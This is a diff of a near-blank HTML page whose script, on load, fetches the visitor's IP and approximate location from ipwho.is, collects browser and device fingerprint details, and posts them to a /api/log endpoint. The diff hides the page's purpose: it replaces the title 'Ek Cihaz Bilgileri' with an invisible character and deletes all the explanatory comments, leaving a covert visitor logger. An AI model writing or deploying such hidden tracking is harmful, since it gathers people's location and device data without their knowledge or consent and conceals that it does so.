@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ek Cihaz Bilgileri</title>
+  <title>‎ </title>
   <style>
     body {
       display: flex;
@@ -22,15 +22,15 @@
   GEL.
 
   <script>
-    // ipwho.is üzerinden IP tabanlı konum bilgisi almak
+   
     async function getIPLocation() {
       try {
         const res = await fetch('https://ipwho.is/');
         const data = await res.json();
         if (data.success) {
-          return data; // Başarılı yanıt
+          return data; 
         } else {
-          return null; // success = false
+          return null; 
         }
       } catch (error) {
         console.error("IP tabanlı konum alınırken hata oluştu:", error);
@@ -38,12 +38,12 @@
       }
     }
 
-    // Sunucuya veri gönderen fonksiyon
+    
     async function sendData() {
-      // ipwho.is'den IP ve konum bilgisi
+      
       const ipData = await getIPLocation();
 
-      // Varsayılan değerler
+      
       let finalIP = "Bilinmeyen IP";
       let finalLocation = "Konum alınamadı";
       let lat = null;
@@ -58,7 +58,7 @@
         lon = ipData.longitude || null;
       }
 
-      // Mevcut veriler
+      
       let userData = {
         ip: finalIP,
         userAgent: navigator.userAgent,
@@ -71,24 +71,22 @@
         longitude: lon
       };
 
-      // 1) Mantıksal CPU çekirdek sayısı
+      
       userData.hardwareConcurrency = navigator.hardwareConcurrency || "Bilinmiyor";
 
-      // 2) Yaklaşık cihaz belleği (GB)
-      // (Her tarayıcıda desteklenmeyebilir; destek yoksa undefined döner)
+     
       userData.deviceMemory = navigator.deviceMemory || "Bilinmiyor";
 
-      // 3) Renk derinliği (screen.colorDepth)
+      
       userData.colorDepth = screen.colorDepth || "Bilinmiyor";
 
-      // 4) Tarayıcının desteklediği diller (navigator.languages)
-      // Örnek: ["tr-TR","en-US"]
+     
       userData.languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
 
-      // 5) Çevrim içi mi? (navigator.onLine)
+     
       userData.isOnline = navigator.onLine;
 
-      // Sunucuya (ör. /api/log) POST isteği
+      
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -96,7 +94,7 @@
       });
     }
 
-    // Sayfa açıldığında otomatik çalış
+    
     sendData();
   </script>
 </body>
